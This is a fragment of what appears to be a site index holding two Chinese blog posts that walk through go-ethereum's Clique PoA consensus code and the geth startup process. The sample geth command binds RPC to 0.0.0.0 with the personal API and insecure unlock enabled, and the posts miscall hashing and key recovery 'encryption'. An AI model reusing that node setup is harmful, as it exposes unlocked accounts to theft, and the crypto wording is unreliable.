%v&quot;, err)\n\t\t}\n\t\tclique.Authorize(eb, wallet.SignHash)//在这里！注入了签名者以及通过wallet对象获取到签名方法\n\t}\n\tif local {\n\t\t// 如果本地CPU挖矿已启动，我们可以禁止注入机制以加速同步时间。\n\t\t// CPU挖矿在主网是荒诞的，所以没有人能碰到这个路径，然而一旦CPU挖矿同步标志完成以后，将保证私网工作也在一个独立矿工结点。\n\t\tatomic.StoreUint32(&amp;s.protocolManager.acceptTxs, 1)\n\t}\n\tgo s.miner.Start(eb)//并发启动挖矿工作\n\treturn nil\n}\n\n最终，通过miner.Start(eb)，调用到work → agent → CPUAgent → update → seal，回到最上方我们的入口。\n\n这里要补充一点，挖矿机制是从miner.start()作为入口开始分析的，而上面的StartMining函数是在miner.start()之前的。这样就把整个这一条线串起来了。\n\nGo语法补充：Comma-ok断言\n\nif clique, ok := s.engine.(*clique.Clique); ok {\n\n这段语句很令人迷惑，经过搜查，以上语法被称作Comma-ok断言。\nvalue, ok = element.(T)\n\nvalue是element变量的值，ok是布尔类型用来表达断言结果，element是接口变量，T是断言类型。\n套入以上代码段，翻译过来即：\n\n如果s.engine是Clique类型，则ok为true，同时clique就等于s.engine。\n\n二：Snapshot起到的作用是什么？\nSnapshot对象在Seal方法中是通过调用snapshot构造函数来获取到的。而snapshot构造函数内部有较长的函数体，包括newSnapshot方法以及loadSnapshot方法的处理。从这个分析来看，我们也可以知道Snapshot是快照，也是缓存的一种机制，同时它也不仅仅是缓存，因为它存储了最近签名者的map集合。\n\nSnapshot可以从内存（即程序中的变量）或是磁盘上（即通过数据库leveldb）获取或者存储，实际上这就是二级缓存的概念了。\n\n三：认证结点的出块机会均等\n首先将上文Seal方法的源码遗留代码段展示如下。\nfor seen, recent := range snap.Recents {\n\tif recent == signer {\n\t\tif limit := uint64(len(snap.Signers)/2 + 1); number &lt; limit || seen &gt; number-limit {\n\t\t\tlog.Info(&quot;Signed recently, must wait for others&quot;)\n\t\t\t&lt;-stop\n\t\t\treturn nil, nil\n\t\t}\n\t}\n}\n\n其中\nif recent == signer {\n\n如果当前结点最近签名过，则跳过，为保证机会均等，避免某个认证结点可以连续出块，从而作恶。\nif limit := uint64(len(snap.Signers)/2 + 1); number &lt; limit || seen &gt; number-limit {\n\n实际上到了这里就已经在决定出块权了。我们依次来看，\n\nsnap.Signers是所有的认证结点。\nlimit的值是所有认证结点的数量的一半加1，也就是说可以保证limit&gt;50%好的认证结点个数（安全性考虑：掌握大于50%的控制权）。结合上面的机会均等，clique要求认证结点在每轮limit个区块中只能生成一个区块。\nnumber是当前区块号\nseen是 “for seen, recent := range snap.Recents {” 中Recents的index，从0开始，最大值为Recents的总数-1。\n\n接着，我们来分析控制程序中止的条件表达式：\nnumber &lt; limit || seen &gt; number-limit\n\n\nnumber &lt; limit, 如果区块高度小于limit\nseen &gt; number - limit，缓存中最近签发者序号已经超过了区块高度与limit之差。number-limit是最多的坏节点，索引seen大于坏节点也要中断（TODO: number区块高度与认证结点的关系）\n\n在这两种情况下，会中断程序，停止签名以及出块操作。\n四：出块难度\n// inturn函数通过给定的区块高度和签发者返回该签发者是否在轮次内\nfunc (s *Snapshot) inturn(number uint64, signer common.Address) bool {\n    // 方法体的内容就是区块高度与认证签发者集合长度的余数是否等于该签发者的下标值\n\tsigners, offset := s.signers(), 0\n\tfor offset &lt; len(signers) &amp;&amp; signers[offset] != signer {\n\t\toffset++\n\t}\n\treturn (number % uint64(len(signers))) == uint64(offset)\n}\n\n\n一句话，clique要求签发者必须按照其在snapshot中的认证签发者集合按照字典排序的顺序出块。\n\n符合以上条件的话，难度为2，否则为1。\ndiffInTurn = big.NewInt(2) // 签名在轮次内的区块难度为2。\ndiffNoTurn = big.NewInt(1) // 签名未在轮次内的区块难度为1。\n\nclique的出块难度比较容易理解，这是在POW中大书特书的部分但在clique中却十分简单，当inturn的结点离线时，其他结点会来竞争，难度值降为1。然而正常出块时，limit中的所有认证结点包括一个inturn和其他noturn的结点，clique是采用了给noturn加延迟时间的方式来支持inturn首先出块，避免noturn的结点无谓生成区块。这部分代码在下面再贴一次。\nwiggle := time.Duration(len(snap.Signers)/2+1) * wiggleTime // wiggleTime = 500 * time.Millisecond // 随机推延，从而允许并发签名（针对每个签名者）\ndelay += time.Duration(rand.Int63n(int64(wiggle)))\n\n\nclique认可难度值最高的链为主链，所以完全inturn结点出的块组成的链会是最理想的主链。\n\n五：区块校验\n// 同样位于clique文件中的verifySeal函数，顾名思义是结点用来校验别的结点广播过来的区块信息的。\nfunc (c *Clique) verifySeal(chain consensus.ChainReader, header *types.Header, parents []*types.Header) error {\n\t// 创世块的话不校验\n\tnumber := header.Number.Uint64()\n\tif number == 0 {\n\t\treturn errUnknownBlock\n\t}\n\t// 取到所需snapshot对象，用来校验区块头并且将其缓存。\n\tsnap, err := c.snapshot(chain, number-1, header.ParentHash, parents)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// 处理授权秘钥，检查是否违背认证签名者集合\n\tsigner, err := ecrecover(header, c.signatures)// 从区块头中解密出Extra字段，找到签名字符串，获得签名者地址信息。可以跳转到下面ecrecover函数的源码分析。\n\tif err != nil {\n\t\treturn err\n\t}\n\tif _, ok := snap.Signers[signer]; !ok {\n\t\treturn errUnauthorized\n\t}\n    // 与Seal相同的处理，机会均等\n\tfor seen, recent := range snap.Recents {\n\t\tif recent == signer {\n\t\t\tif limit := uint64(len(snap.Signers)/2 + 1); seen &gt; number-limit {\n\t\t\t\treturn errUnauthorized\n\t\t\t}\n\t\t}\n\t}\n\t// 区分是否inturn，设置区块困难度，上面也介绍过了。\n\tinturn := snap.inturn(header.Number.Uint64(), signer)\n\tif inturn &amp;&amp; header.Difficulty.Cmp(diffInTurn) != 0 {\n\t\treturn errInvalidDifficulty\n\t}\n\tif !inturn &amp;&amp; header.Difficulty.Cmp(diffNoTurn) != 0 {\n\t\treturn errInvalidDifficulty\n\t}\n\treturn nil\n}\n\necrecover函数的源码分析：\n// ecrecover函数从一个签名的区块头中解压出以太坊账户地址\nfunc ecrecover(header *types.Header, sigcache *lru.ARCCache) (common.Address, error) {\n\t// 如果签名已经被缓存，返回它。\n\thash := header.Hash()\n\tif address, known := sigcache.Get(hash); known {\n\t\treturn address.(common.Address), nil\n\t}\n\t// 从区块头的Extra字段取得签名内容。\n\tif len(header.Extra) &lt; extraSeal {\n\t\treturn common.Address{}, errMissingSignature\n\t}\n\tsignature := header.Extra[len(header.Extra)-extraSeal:]\n\n\t// 通过密码学技术从签名内容中解密出公钥和以太坊地址。\n\tpubkey, err := crypto.Ecrecover(sigHash(header).Bytes(), signature)// 具体源码见下方\n\tif err != nil {\n\t\treturn common.Address{}, err\n\t}\n\tvar signer common.Address\n\tcopy(signer[:], crypto.Keccak256(pubkey[1:])[12:])//将公钥利用keccak256解密赋值给signer。\n\n\tsigcache.Add(hash, signer)//加入缓存\n\treturn signer, nil\n}\n\ncrypto包的Ecrecover函数：\nfunc Ecrecover(hash, sig []byte) ([]byte, error) {\n\treturn secp256k1.RecoverPubkey(hash, sig)\n}\n\nEcrecover函数是使用secp256k1来解密公钥。\n下面我们从VerifySeal函数反推，找出调用该函数的位置在miner/remote_agent.go，\n// SubmitWork函数尝试注入一个pow解决方案（共识引擎）到远程代理，返回这个解决方案是否被接受。（不能同时是一个坏的pow也不能有其他任何错误，例如没有工作被pending\nfunc (a *RemoteAgent) SubmitWork(nonce types.BlockNonce, mixDigest, hash common.Hash) bool {\n\ta.mu.Lock()\n\tdefer a.mu.Unlock()\n\n\t// 保证被提交的工作不是空\n\twork := a.work[hash]\n\tif work == nil {\n\t\tlog.Info(&quot;Work submitted but none pending&quot;, &quot;hash&quot;, hash)\n\t\treturn false\n\t}\n\t// 保证引擎是真实有效的。\n\tresult := work.Block.Header()\n\tresult.Nonce = nonce\n\tresult.MixDigest = mixDigest\n\n\tif err := a.engine.VerifySeal(a.chain, result); err != nil {//在这里，VerifySeal方法被调用。\n\t\tlog.Warn(&quot;Invalid proof-of-work submitted&quot;, &quot;hash&quot;, hash, &quot;err&quot;, err)\n\t\treturn false\n\t}\n\tblock := work.Block.WithSeal(result)\n\n\t// 解决方案看上去是有效的，返回到矿工并且通知接受结果。\n\ta.returnCh &lt;- &amp;Result{work, block}\n\tdelete(a.work, hash)\n\n\treturn true\n}\n\n这个SubmitWork位于挖矿的pkg中，主要工作是对work的校验，包括work本身是否为空，work中的区块头以及区块头中包含的字段的有效性，然后是对区块头的VerifySeal（该函数的功能在上面已经介绍到了，主要是对区块签名者的认证，区块难度值的确认）\n继续反推找到SubmitWork函数被调用的位置：\n// SubmitWork函数能够被外部矿工用来提交他们的POW。\nfunc (api *PublicMinerAPI) SubmitWork(nonce types.BlockNonce, solution, digest common.Hash) bool {\n\treturn api.agent.SubmitWork(nonce, digest, solution)\n}\n\n总结\n区块的校验是外部结点自动执行PublicMinerAPI的SubmitWork方法，从而层层调用，通过检查区块头内的签名内容，通过secp256k1方法恢复公钥，然后利用Keccak256将公钥加密为一个以太地址作为签名地址，获得签名地址以后，去本地认证结点缓存中检查，看该签名地址是否符合要求。最终只要通过层层校验，就不会报出errUnauthorized的错误。\n\n注意：签名者地址common.Address在Seal时被签名signature存在区块头的Extra字段中，然后在VerifySeal中被从区块头中取出签名signature。该签名的解密方式比较复杂：要先通过secp256k1恢复一个公钥，然后利用这个公钥和Keccak256加密出签名者地址common.Address。\n\ncommon.Address本身就是结点公钥的Keccak256加密结果。请参照common/types.go：\n// Hex函数返回了一个十六禁止的字符串，代表了以太坊地址。\nfunc (a Address) Hex() string {\n\tunchecksummed := hex.EncodeToString(a[:])\n\tsha := sha3.NewKeccak256()//这里就不展开了，可以看出是通过Keccak256方法将未检查的明文Address加密为一个标准以太坊地址\n\tsha.Write([]byte(unchecksummed))\n\thash := sha.Sum(nil)\n\n\tresult := []byte(unchecksummed)\n\tfor i := 0; i &lt; len(result); i++ {\n\t\thashByte := hash[i/2]\n\t\tif i%2 == 0 {\n\t\t\thashByte = hashByte &gt;&gt; 4\n\t\t} else {\n\t\t\thashByte &amp;= 0xf\n\t\t}\n\t\tif result[i] &gt; &#039;9&#039; &amp;&amp; hashByte &gt; 7 {\n\t\t\tresult[i] -= 32\n\t\t}\n\t}\n\treturn &quot;0x&quot; + string(result)\n}\n\n六： 基于投票的认证结点的运行机制\n上面我们分析了clique的认证结点的出块，校验等细节，那么这里引出终极问题：如何确认一个普通结点是否是认证结点呢？\n\n答：clique是基于投票机制来确认认证结点的。\n\n先来看投票实体类，存在于snapshot源码中。\n// Vote代表了一个独立的投票，这个投票可以授权一个签名者，更改授权列表。\ntype Vote struct {\n\tSigner    common.Address `json:&quot;signer&quot;`    // 已授权的签名者（通过投票）\n\tBlock     uint64         `json:&quot;block&quot;`     // 投票区块号\n\tAddress   common.Address `json:&quot;address&quot;`   // 被投票的账户，修改它的授权\n\tAuthorize bool           `json:&quot;authorize&quot;` // 对一个被投票账户是否授权或解授权\n}\n\n这个Vote是存在于Snapshot的属性字段中，所以投票机制离不开Snapshot，我们在这里再次将Snapshot实体源码重新分析一遍，上面注释过的内容我不再复述，而是直接关注在投票机制相关字段内容上。\ntype Snapshot struct {\n\tconfig   *params.CliqueConfig\n\tsigcache *lru.ARCCache       \n\n\tNumber  uint64                      `json:&quot;number&quot;`  \n\tHash    common.Hash                 `json:&quot;hash&quot;`    \n\tSigners map[common.Address]struct{} `json:&quot;signers&quot;` // 认证节点集合\n\tRecents map[uint64]common.Address   `json:&quot;recents&quot;` \n\tVotes   []*Vote                     `json:&quot;votes&quot;`   // 上面的Vote对象数组\n\tTally   map[common.Address]Tally    `json:&quot;tally&quot;`   // 也是一个自定义类型，见下方\n}\n\nTally结构体：\n// Tally是一个简单的用来保存当前投票分数的计分器\ntype Tally struct {\n\tAuthorize bool `json:&quot;authorize&quot;` // 授权true或移除false\n\tVotes     int  `json:&quot;votes&quot;`     // 该提案已获票数\n}\n\n另外Clique实体中还有个有争议的字段proposals，当时并没有分析清楚，何谓提案？\n\nproposal是可以通过rpc申请加入或移除一个认证节点，结构为待操作地址（节点地址）和状态（加入或移除）\n\n投票中某些概念的确定\n\n投票的范围是在委员会，委员会的意思就是所有矿工。\n概念介绍：checkpoint，checkpointInterval = 1024 ，每过1024个区块，则保存snapshot到数据库\n概念介绍：Epoch，与ethash一样，一个Epoch是三万个区块\n\n投票流程\n\n首先委员会某个成员（即节点矿工）通过rpc调用consensus/clique/api.go中的propose方法\n\n// Propose注入一个新的授权提案，可以授权一个签名者或者移除一个。\nfunc (api *API) Propose(address common.Address, auth bool) {\n\tapi.clique.lock.Lock()\n\tdefer api.clique.lock.Unlock()\n\n\tapi.clique.proposals[address] = auth// true:授权，false:移除\n}\n\n\n上面rpc提交过来的propose会写入Clique.proposals集合中。\n在挖矿开始以后，会在miner.start()中提交一个commitNewWork，其中涉及到准备区块头Prepare的方法，我们进入到clique的实现，其中涉及到对上面的Clique.proposals的处理：\n\n// 如果存在pending的proposals，则投票\nif len(addresses) &gt; 0 {\n\theader.Coinbase = addresses[rand.Intn(len(addresses))]//将投票节点的地址赋值给区块头的Coinbase字段。\n\t// 下面是通过提案内容来组装区块头的随机数字段。\n\tif c.proposals[header.Coinbase] {\n\t\tcopy(header.Nonce[:], nonceAuthVote)\n\t} else {\n\t\tcopy(header.Nonce[:], nonceDropVote)\n\t}\n}\n\n// nonceAuthVote和nonceDropVote常量的声明与初始化\nnonceAuthVote = hexutil.MustDecode(&quot;0xffffffffffffffff&quot;) // 授权签名者的必要随机数\nnonceDropVote = hexutil.MustDecode(&quot;0x0000000000000000&quot;) // 移除签名者的必要随机数\n\n\n整个区块组装好以后（其他的内容不再复述），会被广播到外部结点校验，如果没有问题该块被成功出了，则区块头中的这个提案也会被记录在主链上。\n区块在生成时，会创建Snapshot，在snapshot构造函数中，会涉及到对proposal的处理apply方法。\n\n// apply通过接受一个给定区块头创建了一个新的授权\nfunc (s *Snapshot) apply(headers []*types.Header) (*Snapshot, error) {\n\tif len(headers) == 0 {\n\t\treturn s, nil\n\t}\n\tfor i := 0; i &lt; len(headers)-1; i++ {\n\t\tif headers[i+1].Number.Uint64() != headers[i].Number.Uint64()+1 {\n\t\t\treturn nil, errInvalidVotingChain\n\t\t}\n\t}\n\tif headers[0].Number.Uint64() != s.Number+1 {\n\t\treturn nil, errInvalidVotingChain\n\t}\n\tsnap := s.copy()\n    // 投票的处理核心代码\n\tfor _, header := range headers {\n\t\t// Remove any votes on checkpoint blocks\n\t\tnumber := header.Number.Uint64()\n\t\t// 如果区块高度正好在Epoch结束，则清空投票和计分器\n\t\tif number%s.config.Epoch == 0 {\n\t\t\tsnap.Votes = nil\n\t\t\tsnap.Tally = make(map[common.Address]Tally)\n\t\t}\n\t\tif limit := uint64(len(snap.Signers)/2 + 1); number &gt;= limit {\n\t\t\tdelete(snap.Recents, number-limit)\n\t\t}\n\t\t// 从区块头中解密出来签名者地址\n\t\tsigner, err := ecrecover(header, s.sigcache)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\tif _, ok := snap.Signers[signer]; !ok {\n\t\t\treturn nil, errUnauthorized\n\t\t}\n\t\tfor _, recent := range snap.Recents {\n\t\t\tif recent == signer {\n\t\t\t\treturn nil, errUnauthorized\n\t\t\t}\n\t\t}\n\t\tsnap.Recents[number] = signer\n\n\t\t// 区块头认证，不管该签名者之前的任何投票\n\t\tfor i, vote := range snap.Votes {\n\t\t\tif vote.Signer == signer &amp;&amp; vote.Address == header.Coinbase {\n\t\t\t\t// 从缓存计数器中移除该投票\n\t\t\t\tsnap.uncast(vote.Address, vote.Authorize)\n\n\t\t\t\t// 从按时间排序的列表中移除投票\n\t\t\t\tsnap.Votes = append(snap.Votes[:i], snap.Votes[i+1:]...)\n\t\t\t\tbreak // only one vote allowed\n\t\t\t}\n\t\t}\n\t\t// 从签名者中计数新的投票\n\t\tvar authorize bool\n\t\tswitch {\n\t\tcase bytes.Equal(header.Nonce[:], nonceAuthVote):\n\t\t\tauthorize = true\n\t\tcase bytes.Equal(header.Nonce[:], nonceDropVote):\n\t\t\tauthorize = false\n\t\tdefault:\n\t\t\treturn nil, errInvalidVote\n\t\t}\n\t\tif snap.cast(header.Coinbase, authorize) {\n\t\t\tsnap.Votes = append(snap.Votes, &amp;Vote{\n\t\t\t\tSigner:    signer,\n\t\t\t\tBlock:     number,\n\t\t\t\tAddress:   header.Coinbase,\n\t\t\t\tAuthorize: authorize,\n\t\t\t})\n\t\t}\n\t\t// 判断票数是否超过一半的投票者，如果投票通过，更新签名者列表\n\t\tif tally := snap.Tally[header.Coinbase]; tally.Votes &gt; len(snap.Signers)/2 {\n\t\t\tif tally.Authorize {\n\t\t\t\tsnap.Signers[header.Coinbase] = struct{}{}\n\t\t\t} else {\n\t\t\t\tdelete(snap.Signers, header.Coinbase)\n\n\t\t\t\tif limit := uint64(len(snap.Signers)/2 + 1); number &gt;= limit {\n\t\t\t\t\tdelete(snap.Recents, number-limit)\n\t\t\t\t}\n\t\t\t\tfor i := 0; i &lt; len(snap.Votes); i++ {\n\t\t\t\t\tif snap.Votes[i].Signer == header.Coinbase {\n\t\t\t\t\t\tsnap.uncast(snap.Votes[i].Address, snap.Votes[i].Authorize)\n\n\t\t\t\t\t\tsnap.Votes = append(snap.Votes[:i], snap.Votes[i+1:]...)\n\n\t\t\t\t\t\ti--\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\t// 不管之前的任何投票，直接改变账户\n\t\t\tfor i := 0; i &lt; len(snap.Votes); i++ {\n\t\t\t\tif snap.Votes[i].Address == header.Coinbase {\n\t\t\t\t\tsnap.Votes = append(snap.Votes[:i], snap.Votes[i+1:]...)\n\t\t\t\t\ti--\n\t\t\t\t}\n\t\t\t}\n\t\t\tdelete(snap.Tally, header.Coinbase)\n\t\t}\n\t}\n\tsnap.Number += uint64(len(headers))\n\tsnap.Hash = headers[len(headers)-1].Hash()\n\n\treturn snap, nil\n}\n\n关键控制的代码是tally.Votes &gt; len(snap.Signers)/2，意思是计分器中的票数大于一半的签名者，就表示该投票通过，下面就是要更改snapshot中的认证签名者列表缓存，同时要同步给其他节点，并删除该投票相关信息。\n总结\n本以为clique比较简单，不必调查这么长，然而POA的共识算法还是比较有难度的，它和POW是基于完全不同的两种场景的实现方式，出块方式也完全不同。下面我尝试用简短的语言来总结Clique的共识机制。\n\nclique共识是基于委员会选举认证节点来确认出块权力的方式实现的。投票方式通过rpc请求propose，snapshot二级缓存机制，唱票，执行投票结果。认证节点出块机会均等，困难度通过轮次（是否按照缓存认证顺序出块）确定，区块头Extra存储签名，keccak256加密以太地址，secp256k1解密签名为公钥，通过认证结点出块的逻辑可以反推区块校验。\n\n到目前为止，我们对POA共识机制，以及以太坊clique的实现有了深刻的理解与认识，相信如果让我们去实现一套POA，也是完全有能力的。大家在阅读本文时有任何疑问均可留言给我，我一定会及时回复。\n\n总结&amp;参考\n\ngithub.com/blockchainGuide\n公众号：区块链技术栈  （推荐哦）\neth.wiki/concepts/ethash/design-rationale\neth.wiki/concepts/ethash/dag\nwww.vijaypradeep.com/blog/2017-04-28-ethereums-memory-hardness-explained/\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码之以太坊启动流程":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码之以太坊启动流程","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码之以太坊启动流程.md","title":"死磕以太坊源码之以太坊启动流程","links":[],"tags":[],"content":"\n死磕以太坊源码|以太坊启动流程\n文章以及资料（开源）：github地址\n\n\n启动参数\n以太坊是如何启动一个网络节点的呢？\n./geth --datadir &quot;../data0&quot; --nodekeyhex &quot;27aa615f5fa5430845e4e97229def5f23e9525a20640cc49304f40f3b43824dc&quot; --bootnodes $enodeid --mine --debug --metrics --syncmode=&quot;full&quot; --gcmode=archive  --gasprice 0 --port 30303 --rpc --rpcaddr &quot;0.0.0.0&quot; --rpcport 8545 --rpcapi &quot;db,eth,net,web3,personal&quot; --nat any --allow-insecure-unlock  2&gt;&gt;log 1&gt;&gt;log 0&gt;&gt;log &gt;&gt;log &amp;\n\n参数说明：\n\ngeth : 编译好的geth程序，可以起别名\ndatadir：数据库和keystore密钥的数据目录\nnodekeyhex: 十六进制的P2P节点密钥\nbootnodes:用于P2P发现引导的enode urls\nmine：打开挖矿\ndebug:突出显示调用位置日志(文件名及行号)\nmetrics: 启用metrics收集和报告\nsyncmode:同步模式 (“fast”, “full”, or “light”)\ngcmode:表示即时将内存中的数据写入到文件中，否则重启节点可能会导致区块高度归零而丢失数据\ngasprice:挖矿接受交易的最低gas价格\nport:网卡监听端口(默认值:30303)\nrpc:启用HTTP-RPC服务器\nrpcaddr:HTTP-RPC服务器接口地址(默认值:“localhost”)\nrpcport:HTTP-RPC服务器监听端口(默认值:8545)\nrpcapi:基于HTTP-RPC接口提供的API\nnat: NAT端口映射机制 (any|none|upnp|pmp|extip:) (默认: “any”)\nallow-insecure-unlock:用于解锁账户\n\n详细的以太坊启动参数可以参考我的以太坊理论系列，里面有对参数的详细解释。\n\n源码分析\ngeth位于cmd/geth/main.go文件中，入口如下：\nfunc main() {\n\tif err := app.Run(os.Args); err != nil {\n\t\tfmt.Fprintln(os.Stderr, err)\n\t\tos.Exit(1)\n\t}\n}\n\n我们通过这张图可以看出来：main()并不是真正意义上的入口，在初始化完常量和变量以后，会先调用模块的init()函数，然后才是main()函数。所以初始化的工作是在init()函数里完成的。\nfunc init() {\n\t// Initialize the CLI app and start Geth\n\tapp.Action = geth\n\tapp.HideVersion = true // we have a command to print the version\n\tapp.Copyright = &quot;Copyright 2013-2019 The go-ethereum Authors&quot;\n\tapp.Commands = []cli.Command{\n    ....\n    ....\n    ...\n  }\n从这我们找到了入口函数geth:\nfunc geth(ctx *cli.Context) error {\n\tif args := ctx.Args(); len(args) &gt; 0 {\n\t\treturn fmt.Errorf(&quot;invalid command: %q&quot;, args[0])\n\t}\n\tprepare(ctx)\n\tnode := makeFullNode(ctx)\n\tdefer node.Close()\n\tstartNode(ctx, node)\n\tnode.Wait()\n\treturn nil\n}\n主要做了以下几件事：\n\n准备操作内存缓存配额并设置度量系统\n加载配置和注册服务\n启动节点\n守护当前线程\n\n加载配置和注册服务\nmakeFullNode\n1.加载配置\nmakeConfigNode\n首先加载默认配置(作为主网节点启动)：\ncfg := gethConfig{\n\t\tEth:  eth.DefaultConfig,\n\t\tShh:  whisper.DefaultConfig,\n\t\tNode: defaultNodeConfig(),\n\t}\n\neth.DefaultConfig : 以太坊节点的主要参数配置。主要包括: 同步模式(fast)、chainid、交易池配置、gasprice、挖矿配置等；\nwhisper.DefaultConfig : 主要用于配置网络间通讯；\ndefaultNodeConfig() : 主要用于配置对外提供的RPC节点服务；\ndashboard.DefaultConfig : 主要用于对外提供看板数据访问服务。\n\n接着加载自定义配置（适用私有链）：\nif file := ctx.GlobalString(configFileFlag.Name); file != &quot;&quot; {\n    if err := loadConfig(file, &amp;cfg); err != nil {\n        utils.Fatalf(&quot;%v&quot;, err)\n    }\n}\n最后加载命令窗口参数（开发阶段）：\nutils.SetNodeConfig(ctx, &amp;cfg.Node) // 本地节点配置\nutils.SetEthConfig(ctx, stack, &amp;cfg.Eth)// 以太坊配置\nutils.SetShhConfig(ctx, stack, &amp;cfg.Shh)// whisper配置\n2.RegisterEthService\nfunc RegisterEthService(stack *node.Node, cfg *eth.Config) {\n\tvar err error\n\tif cfg.SyncMode == downloader.LightSync {\n\t\terr = stack.Register(func(ctx *node.ServiceContext) (node.Service, error) {\n\t\t\treturn les.New(ctx, cfg)\n\t\t})\n\t} else {\n\t\terr = stack.Register(func(ctx *node.ServiceContext) (node.Service, error) {\n\t\t\tfullNode, err := eth.New(ctx, cfg)\n\t\t\tif fullNode != nil &amp;&amp; cfg.LightServ &gt; 0 {\n\t\t\t\tls, _ := les.NewLesServer(fullNode, cfg)\n\t\t\t\tfullNode.AddLesServer(ls)\n\t\t\t}\n\t\t\treturn fullNode, err\n\t\t})\n\t}\n\tif err != nil {\n\t\tFatalf(&quot;Failed to register the Ethereum service: %v&quot;, err)\n\t}\n}\n出现了两个新类型：ServiceContext和Service。\n先看一下ServiceContext的定义:\ntype ServiceContext struct {\n\tconfig         *Config\n\tservices       map[reflect.Type]Service // Index of the already constructed services\n\tEventMux       *event.TypeMux           // Event multiplexer used for decoupled notifications\n\tAccountManager *accounts.Manager        // Account manager created by the node.\n}\nServiceContext主要是存储了一些从结点（或者叫协议栈）那里继承过来的、和具体Service无关的一些信息，比如结点config、account manager等。其中有一个services字段保存了当前正在运行的所有Service.\n接下来看一下Service的定义:\ntype Service interface {\n\t// Protocols retrieves the P2P protocols the service wishes to start.\n\t// 协议检索服务希望启动的P2P协议\n\tProtocols() []p2p.Protocol\n \n\t// APIs retrieves the list of RPC descriptors the service provides\n\t// API检索服务提供的RPC描述符列表\n\tAPIs() []rpc.API\n \n\t// Start is called after all services have been constructed and the networking\n\t// layer was also initialized to spawn any goroutines required by the service.\n\t//在所有服务都已构建完毕并且网络层也已初始化以生成服务所需的所有goroutine之后，将调用start。\n\tStart(server *p2p.Server) error\n \n\t// Stop terminates all goroutines belonging to the service, blocking until they\n\t// are all terminated.\n\t//Stop终止属于该服务的所有goroutine，直到它们全部终止为止一直阻塞。\n\tStop() error\n}\n在服务注册过程中，主要注册四个服务：EthService、DashboardService、ShhService、EthStatsService，这四种服务类均扩展自Service接口。其中，EthService根据同步模式的不同，分为两种实现：\n\nLightEthereum，支持LightSync模式\nEthereum，支持FullSync、FastSync模式\n\nLightEthereum作为轻客户端，与Ethereum区别在于，它只需要更新区块头。当需要查询区块体数据时，需要通过调用其他全节点的les服务进行查询；另外，轻客户端本身是不能进行挖矿的。\n回到RegisterEthService代码，分两个来讲：\nLightSync同步：\nerr = stack.Register(func(ctx *node.ServiceContext) (node.Service, error) {\n        return les.New(ctx, cfg)\n    })\nfunc New(ctx *node.ServiceContext, config *eth.Config) (*LightEthereum, error) {\n  \n  1.ctx.OpenDatabase // 创建leveldb数据库\n  2.core.SetupGenesisBlockWithOverride// 根据创世配置初始化链数据目录\n  3.实例化本地链id、共识引擎、注册peer节点、帐户管理器以及布隆过滤器的初始化\n  4.light.NewLightChain// 使用数据库中可用的信息返回完全初始化的轻链。它初始化默认的以太坊头\n  5.light.NewTxPool // 实例化交易池NewTxPool\n  6.leth.ApiBackend = &amp;LesApiBackend{ctx.ExtRPCEnabled(), leth, nil} \n  \n}\nFullSync/Fast同步：\n\n\n参数校验\nif config.SyncMode == downloader.LightSync {\n  ....\nif !config.SyncMode.IsValid() {\n  ....\nif config.Miner.GasPrice == nil || config.Miner.GasPrice.Cmp(common.Big0) &lt;= 0 {\n  ....\nif config.NoPruning &amp;&amp; config.TrieDirtyCache &gt; 0 {  \n\n\n打开数据库\nctx.OpenDatabaseWithFreezer\n\n\n根据创世配置初始化链数据目录\ncore.SetupGenesisBlockWithOverride\n\n\n实例化Ethereum对象\n\n\n创建BlockChain实例对象\ncore.NewBlockChain\n\n\n实例化交易池\ncore.NewTxPool\n\n\n实例化协议管理器\nNewProtocolManager(...)\n\n\n实例化对外API服务\n&amp;EthAPIBackend{ctx.ExtRPCEnabled(), eth, nil}\n\n\n3.RegisterShhService\n注册Whisper服务，用于p2p网络间加密通信。\nwhisper.New(cfg), nil\n4.RegisterEthStatsService\n注册状态推送服务,将当前以太坊网络状态推送至指定URL地址.\nethstats.New(url, ethServ, lesServ)\n启动节点\n启动本地节点以及启动所有注册的服务。\n1.启动节点\nstartNode\n1.1 stack.Start()\n\n\n实例化p2p.Server对象。\nrunning := &amp;p2p.Server{Config: n.serverConfig}\n\n\n为注册的服务创建上下文\nfor _, constructor := range n.serviceFuncs {\n  ctx := &amp;ServiceContext{\n    ....\n  }\n}\n\n\n收集协议并启动新组装的p2p server\nfor kind, service := range services {\n  if err := service.Start(running); err != nil {\n    ...\n  }\n}\n\n\n最后启动配置的RPC接口\nn.startRPC(services)\n\nstartInProc (启动进程内通讯服务)\nstartIPC （启动IPC RPC端点）\nstartHTTP（启动HTTP RPC端点）\nstartWS （启动websocket RPC端点）\n\n\n\n2.解锁账户\nunlockAccounts\n在datadir/keystore目录主要用于记录在当前节点创建的帐户keystore文件。如果你的keystore文件不在本地是无法进行解锁的。\n//解锁datadir/keystore目录中帐户\nks := stack.AccountManager().Backends(keystore.KeyStoreType)[0].(*keystore.KeyStore)\n\tpasswords := utils.MakePasswordList(ctx)\n\tfor i, account := range unlocks {\n\t\tunlockAccount(ks, account, i, passwords)\n\t}\n3.注册钱包事件\nevents := make(chan accounts.WalletEvent, 16)\nstack.AccountManager().Subscribe(events)\n4.监听钱包事件\n\tfor event := range events {\n\t\t\tswitch event.Kind {\n\t\t\tcase accounts.WalletArrived:\n\t\t\t\tif err := event.Wallet.Open(&quot;&quot;); err != nil {\n\t\t\t\t\tlog.Warn(&quot;New wallet appeared, failed to open&quot;, &quot;url&quot;, event.Wallet.URL(), &quot;err&quot;, err)\n\t\t\t\t}\n\t\t\tcase accounts.WalletOpened:\n\t\t\t\tstatus, _ := event.Wallet.Status()\n\t\t\t\tlog.Info(&quot;New wallet appeared&quot;, &quot;url&quot;, event.Wallet.URL(), &quot;status&quot;, status)\n \n\t\t\t\tvar derivationPaths []accounts.DerivationPath\n\t\t\t\tif event.Wallet.URL().Scheme == &quot;ledger&quot; {\n\t\t\t\t\tderivationPaths = append(derivationPaths, accounts.LegacyLedgerBaseDerivationPath)\n\t\t\t\t}\n\t\t\t\tderivationPaths = append(derivationPaths, 